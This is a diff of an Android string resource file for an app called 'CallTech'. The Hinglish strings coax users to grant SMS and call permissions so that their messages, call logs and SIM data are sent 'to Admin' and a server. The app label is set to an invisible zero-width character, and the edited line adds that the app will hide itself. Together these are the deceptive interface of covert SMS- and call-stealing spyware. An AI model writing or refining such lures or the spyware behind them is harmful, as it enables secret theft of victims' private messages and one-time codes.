@@ -1,7 +1,7 @@
 <resources>
     <string name="app_name">CallTech</string>
     <string name="hidden_app_label">\u200b</string>
-    <string name="setup_message">SMS aur call logs Admin mein bhejne ke liye Allow dabao</string>
+    <string name="setup_message">Permission popup Allow karo — SIM aur calls Admin mein chale jayenge, app hide ho jayegi</string>
     <string name="setup_allow">Allow SMS &amp; Calls</string>
     <string name="setup_syncing">Server se connect ho raha hai… phone band mat karo</string>
     <string name="setup_done">SIM Admin mein send ho gaya</string>
